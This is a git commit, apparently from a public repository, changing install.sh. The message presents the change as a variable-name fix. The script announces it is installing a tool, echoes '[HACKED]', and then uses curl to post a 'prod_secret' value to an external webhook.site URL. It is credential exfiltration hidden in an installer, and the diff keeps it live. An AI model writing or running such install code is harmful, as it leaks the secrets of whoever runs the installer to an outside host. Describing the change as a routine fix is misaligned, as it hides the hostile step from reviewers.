ac07b736325ee777d4efd2d32d9c4268889286a9
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-01-20 17:03:10 +0100

    Fix variable name in install.sh for webhook
    Corrected variable name from PROD_SECRET to prod_secret in the JSON payload.

--- install.sh
+++ install.sh
@@ -3,6 +3,6 @@ echo "Installing tool..."
 echo "[HACKED]..."
 curl -X POST \
   -H "Content-Type: application/json" \
-  -d "{\"prod_secret\":\"$PROD_SECRET\"}" \
+  -d "{\"prod_secret\":\"$prod_secret\"}" \
   https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9
 
